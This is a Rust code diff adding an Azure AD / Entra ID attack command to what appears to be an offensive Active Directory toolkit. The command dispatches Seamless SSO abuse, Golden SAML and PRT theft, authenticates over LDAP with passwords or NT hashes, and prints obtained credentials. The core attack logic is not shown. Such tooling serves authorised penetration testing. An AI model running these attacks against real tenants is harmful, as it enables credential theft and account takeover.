@@ -3,8 +3,9 @@
 use crate::auth::Credentials;
 use crate::banner;
 use crate::{
-    AdcsAction, C2Action, Cli, CrackMode, DumpSource, ForgeAction, MoveAction, OutputFormat,
-    PluginAction, ReportFormat, ScanType, SccmAction, SccmTechnique, SecretsAction, ShellType,
+    AdcsAction, AzureAction, C2Action, Cli, CrackMode, DumpSource, ForgeAction, MoveAction,
+    OutputFormat, PluginAction, ReportFormat, ScanType, SccmAction, SccmTechnique, SecretsAction,
+    ShellType,
 };
 use colored::Colorize;
 use kerberos_asn1::Asn1Object;
@@ -4382,4 +4383,103 @@ pub async fn cmd_c2(manager: &mut C2Manager, action: C2Action) -> i32 {
         }
     }
     0
+}
+
+// ═══════════════════════════════════════════════════════════
+// cmd_azure — Azure AD / Entra ID Attacks
+// ═══════════════════════════════════════════════════════════
+
+pub async fn cmd_azure(cli: &Cli, action: &AzureAction) -> i32 {
+    banner::print_module_banner("AZURE AD");
+
+    let domain = match cli.domain.as_deref() {
+        Some(d) => d.to_string(),
+        None => {
+            banner::print_fail("--domain is required for Azure AD attacks");
+            return 1;
+        }
+    };
+    let dc_ip = match cli.dc_host.as_deref() {
+        Some(d) => d.to_string(),
+        None => {
+            banner::print_fail("--dc-ip is required for Azure AD attacks");
+            return 1;
+        }
+    };
+    let username = match cli.username.as_deref() {
+        Some(u) => u.to_string(),
+        None => {
+            banner::print_fail("--username is required for Azure AD attacks");
+            return 1;
+        }
+    };
+
+    let has_hash = cli.nt_hash.is_some();
+    let ldap_pass = cli.nt_hash.as_deref().or(cli.password.as_deref()).unwrap_or("");
+
+    println!("  {} Domain: {}", "\u{2591}".bright_black(), domain.cyan());
+    println!("  {} DC:     {}", "\u{2591}".bright_black(), dc_ip.cyan());
+
+    let operation = match action {
+        AzureAction::Enum => overthrone_core::azure_ad::AzureAdOperation::EnumHybridIdentity,
+        AzureAction::SeamlessSso => overthrone_core::azure_ad::AzureAdOperation::SeamlessSsoAbuse,
+        AzureAction::GoldenSaml { .. } => overthrone_core::azure_ad::AzureAdOperation::GoldenSaml,
+        AzureAction::PrtTheft => overthrone_core::azure_ad::AzureAdOperation::PrtTheft,
+    };
+
+    let ldap_result = {
+        let ldap_user = if has_hash {
+            format!("{}\\{}", domain, username)
+        } else {
+            username.clone()
+        };
+        overthrone_core::proto::ldap::LdapSession::connect(&dc_ip, &domain, &ldap_user, ldap_pass, has_hash)
+            .await
+    };
+
+    let config = overthrone_core::azure_ad::AzureAdConfig {
+        domain: domain.clone(),
+        dc_ip: dc_ip.clone(),
+        tenant_id: None,
+        username: username.clone(),
+        password: cli.password.clone(),
+        nt_hash: cli.nt_hash.clone(),
+        enumerate_hybrid: matches!(action, AzureAction::Enum),
+        operation,
+    };
+
+    match ldap_result {
+        Ok(mut ldap) => {
+            match overthrone_core::azure_ad::execute_azure_ad_attack(&config, &mut ldap).await {
+                Ok(result) => {
+                    for line in &result.log {
+                        println!("  {}", line.bright_white());
+                    }
+                    if result.success {
+                        banner::print_success(&format!("{} completed", result.operation));
+                        for cred in &result.obtained_credentials {
+                            println!("  {}", cred.bright_green());
+                        }
+                    } else {
+                        banner::print_fail(&format!("{} failed", result.operation));
+                    }
+                    if let Err(e) = ldap.disconnect().await {
+                        warn!("LDAP disconnect: {e}");
+                    }
+                    if result.success { 0 } else { 1 }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Azure AD attack failed: {e}"));
+                    if let Err(e) = ldap.disconnect().await {
+                        warn!("LDAP disconnect: {e}");
+                    }
+                    1
+                }
+            }
+        }
+        Err(e) => {
+            banner::print_fail(&format!("Failed to connect to LDAP: {e}"));
+            1
+        }
+    }
 }
